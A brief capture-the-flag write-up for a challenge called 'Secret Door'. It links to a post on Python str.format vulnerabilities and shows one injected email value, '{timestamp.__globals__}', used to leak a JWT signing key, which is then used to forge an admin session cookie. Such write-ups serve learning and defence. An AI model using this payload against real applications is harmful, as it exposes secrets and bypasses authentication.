# Secret Door

Writeup

Python format string vulnerability: https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/ 

```
zhong2+{timestamp.__globals__}@gmail.com 
```

![image-20240930233105868](https://api.2h0ng.wiki:443/noteimages/2024/09/30/23-31-06-e3ff85793d66422a09b6c772600023f3.png)

![image-20240930233208418](https://api.2h0ng.wiki:443/noteimages/2024/09/30/23-32-08-15a6e12deea35f6facc0bd18b5e87d93.png)

Then use the jwt key to sign session cookie to access admin endpoint.

